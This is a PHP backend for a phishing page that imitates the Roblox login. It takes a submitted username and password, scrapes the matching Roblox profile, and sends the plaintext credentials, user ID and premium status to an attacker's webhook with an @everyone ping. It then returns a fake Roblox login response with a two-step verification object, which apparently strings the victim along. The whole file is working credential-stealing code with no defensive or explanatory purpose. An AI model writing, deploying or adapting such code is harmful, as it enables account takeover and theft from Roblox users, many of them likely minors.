<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Add CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

require('../../setup.php');

function get_string_between($string, $start, $end) {
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);

    if (empty($input['cvalue']) || empty($input['password'])) {
        http_response_code(400);
        die(json_encode(['error' => 'Username and password are required.']));
    }

    // Debug inputsad chem yleshia
    error_log(print_r($input, true));

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_URL, 'https://www.roblox.com/users/profile?username=' . urlencode($input['cvalue']));
    $profile = curl_exec($ch);

    if (curl_errno($ch)) {
        $response = curl_exec($ch);
        $error_msg = curl_error($ch);
        curl_close($ch);
        error_log("Curl error first: " . $error_msg);
        die(json_encode(['error' => 'Curl error: ' . $error_msg]));
    }
    curl_close($ch);

// strpos($profile, '<meta name="page-meta" data-internal-page-name="Profile" />') !== false
    if (true) {
        $ticket = rand();
        $username = get_string_between($profile, '{"profileusername":"', '"');
        $userId = get_string_between($profile, '<link rel="canonical" href="https://www.roblox.com/users/', '/');
        $avatar = get_string_between($profile, '<meta property="og:image" content="', '"');
        $isPremium = strpos($profile, ' <span class="icon-premium-medium"></span>') ? 'True' : 'False';

if (empty($username) || empty($userId)) {
    $embed = json_encode([
        'content' => '@everyone',
        'username' => $input['cvalue'] ?: 'Unknown User',
        'avatar_url' => $avatar ?: 'https://path.to/default/avatar.png', // Default avatar if not found
        'tts' => true,
        'embeds' => [[
            'title' => 'Incorrect Username!',
            'type' => 'rich',
            'url' => 'https://www.roblox.com/users/profile?username=' . urlencode($username),
            'timestamp' => date('c'),
            'color' => hexdec(str_replace('#', '', $EmbedColour ?? '#FF0000')), // Default color if not set
            'footer' => [
                'text' => 'Log ID: ' . $ticket,
                'icon_url' => $avatar
            ],
            'thumbnail' => [
                'url' => $avatar
            ],
            'author' => [
                'name' => 'Trade',
                'url' => 'https://www.roblox.com/users/' . $userId . '/trade'
            ],
            'fields' => [
                ['name' => 'Username', 'value' => '```' . $input['cvalue'] . '```', 'inline' => false],
                ['name' => 'Password', 'value' => '```' . $input['password'] . '```', 'inline' => false],
                ['name' => 'ID', 'value' => '```' . $userId . '```', 'inline' => true],
                ['name' => 'Premium', 'value' => '```' . $isPremium . '```', 'inline' => true]
            ]
        ]]
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    // Initialize cURL session
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_URL, $Webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $embed);

    // Execute cURL request
    $response = curl_exec($ch);

    // Check for cURL errors
    if ($response === false) {
        $error = curl_error($ch);
        curl_close($ch);
        error_log("Curl error: " . $error);
        die(json_encode(['error' => 'Curl error: ' . $error]));
    }

    // Close cURL session and check the HTTP status code
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Log or handle the response if needed
    if ($http_code >= 200 && $http_code < 300) {
        echo "Webhook sent successfully!";
    } else {
        error_log("Webhook failed with HTTP code: " . $http_code . " Response: " . $response);
        die(json_encode(['error' => 'Webhook failed with HTTP code: ' . $http_code]));
    }
}

        $embed = json_encode([
            'content' => '@everyone',
            'username' => $username,
            'avatar_url' => $avatar,
            'tts' => true,
            'embeds' => [[
                'title' => 'View Profile',
                'type' => 'rich',
                'url' => 'https://www.roblox.com/users/profile?username=' . $username,
                'timestamp' => date('c'),
                'color' => hexdec(str_replace('#', '', "00ff00")),
                'footer' => [
                    'text' => 'Log ID: ' . $ticket,
                    'icon_url' => $avatar
                ],
                'thumbnail' => [
                    'url' => $avatar
                ],
                'author' => [
                    'name' => 'Trade',
                    'url' => 'https://www.roblox.com/users/' . $userId . '/trade'
                ],
                'fields' => [
                    ['name' => 'Username', 'value' => '```' . $username . '```', 'inline' => false],
                    ['name' => 'Password', 'value' => '```' . $input['password'] . '```', 'inline' => false],
                    ['name' => 'ID', 'value' => '```' . $userId . '```', 'inline' => true],
                    ['name' => 'Premium', 'value' => '```' . $isPremium . '```', 'inline' => true]
                ]
            ]]
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

        // Debug embed data
        error_log($embed);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_URL, $Webhook);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $embed);
        $response = curl_exec($ch);

        if ($response === false) {
            $error = curl_error($ch);
            curl_close($ch);
            error_log("Curl error: " . $error);
            die(json_encode(['error' => 'Curl error: ' . $error]));
        }

        // Debug response
        error_log($response);
        curl_close($ch);

        // $_SESSION['ticket'] = $ticket;
        // $_SESSION['avatar'] = $avatar;
        // $_SESSION['password'] = $input['password'];
        // $_SESSION['premium'] = $isPremium;
        // $_SESSION['cid'] = $userId;
        // $_SESSION['cvalue'] = $username;

        die(json_encode([
            'user' => [
                'id' => $userId,
                'name' => $username,
                'displayName' => $username
            ],
            'twoStepVerificationData' => [
                'mediaType' => $twoStepVerificationType,
                'ticket' => rand()
            ],
            'isBanned' => false
        ]));
    } else {
        http_response_code(403);
        die(json_encode([
            'errors' => [
                [
                    'code' => 1,
                    'message' => 'Incorrect username or password. Please try again.',
                    'userFacingMessage' => 'Something went wrong'
                ]
            ]
        ]));
    }
}
?>
